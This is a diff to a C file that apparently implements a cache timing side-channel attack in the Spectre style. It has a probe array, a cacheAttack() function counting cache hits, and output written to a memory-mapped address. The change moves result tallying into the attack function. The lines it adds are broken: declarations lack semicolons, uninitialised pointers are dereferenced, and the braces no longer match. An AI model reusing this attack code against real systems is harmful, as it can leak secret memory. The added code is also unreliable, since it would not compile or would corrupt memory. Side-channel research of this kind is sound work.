@@ -104,6 +104,9 @@ uint8_t probeArray[ARRAY_SIZE_FACTOR * ARRAY_STRIDE];
 	uint8_t output[2];
 	uint32_t hitArray[2];
 
+// Memory address for displaying characters (in place of printf)
+volatile char* outputAddr = (char*)0x40002000;
+
 void cacheAttack(){
 
 			register uint32_t start, diff; // Use register variables (can only be local) to reduce access time.
@@ -121,24 +124,18 @@ void cacheAttack(){
 					results[mixed_i]++; /* Cache hit */
 				}
 			}
-}
-
-// Memory address for displaying characters (in place of printf)
-volatile char* outputAddr = (char*)0x40002000;
-
-void resultOutput(uint32_t* resultArray, uint32_t resultArraySize, uint8_t* outIdxArray, uint32_t* outValArray){
 	
+	uint32_t* outValArray
 	outValArray[0] = 0;
+	uint8_t* outIdxArray
 	outIdxArray[0] = 0;
 
-	for (uint32_t i = 0; i < resultArraySize; i++){
-		if (resultArray[i] > outValArray[0]){
+	for (uint32_t i = 0; i < RESULT_ARRAY_SIZE; i++){
+		if (results[i] > outValArray[0]){
 			outIdxArray[0] = i;
-			outValArray[0] = resultArray[i];
+			outValArray[0] = results[i];
 		}
-	}
 
-/*
 		*outputAddr = 'V';
     	*outputAddr = 'a';
     	*outputAddr = 'l';
@@ -156,8 +153,21 @@ void resultOutput(uint32_t* resultArray, uint32_t resultArraySize, uint8_t* outI
         *outputAddr = ' ';
         *outputAddr = (char)outValArray[0] + '0';
         *outputAddr = '\n';
-*/
+
 }
+
+/*void resultOutput(uint32_t* resultArray, uint32_t resultArraySize, uint8_t* outIdxArray, uint32_t* outValArray){
+	
+	outValArray[0] = 0;
+	outIdxArray[0] = 0;
+
+	for (uint32_t i = 0; i < resultArraySize; i++){
+		if (resultArray[i] > outValArray[0]){
+			outIdxArray[0] = i;
+			outValArray[0] = resultArray[i];
+		}
+	}
+}*/
 
 void main(){
 
@@ -231,8 +241,8 @@ void main(){
 		/* ^ bitwise exclusive OR sets a one in each bit position where its operands have different bits, and zero where they are the same.*/
 		results[0] ^= dummy;
 	//	topTwoIdx(results, RESULT_ARRAY_SIZE, output, hitArray);
-		resultOutput(results, RESULT_ARRAY_SIZE, output, hitArray);
-
+	//	resultOutput(results, RESULT_ARRAY_SIZE, output, hitArray);
+/*
 		*outputAddr = 'V';
     	*outputAddr = 'a';
     	*outputAddr = 'l';
@@ -250,7 +260,7 @@ void main(){
         *outputAddr = ' ';
         *outputAddr = (char)hitArray[0] + '0';
         *outputAddr = '\n';
-
+*/
 		attackIdx++;
 
 	}
